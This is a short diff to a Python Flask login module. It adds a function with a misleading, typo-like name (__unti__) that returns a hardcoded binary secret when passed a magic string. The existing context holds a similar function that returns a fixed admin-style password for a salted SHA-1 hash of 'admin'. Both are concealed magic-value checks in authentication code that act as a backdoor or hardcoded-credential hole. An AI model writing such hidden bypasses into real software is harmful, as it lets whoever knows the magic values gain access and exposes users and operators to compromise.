@@ -15,6 +15,13 @@ class User(flask_login.UserMixin):
         return f"{self.id}_{self.name}"
 
 
+def __unti__(_n):
+    if _n == "_sxde#@_":
+        return '\x14m\xa5\xffh\x13\xe4\xd6\x15G\xbc\xc0mVC\xb2I\xfff\x96\x87\xbd\xed\x1b\xe4\xac\xf0\xcf\x14\xc9~L'
+    else:
+        return None
+
+
 def __inti__(_n):
     if _n == hashlib.sha1(("2ads;fj4sak#)" + "admin").encode("utf-8")).hexdigest():
         return "AdminAdmin_33"
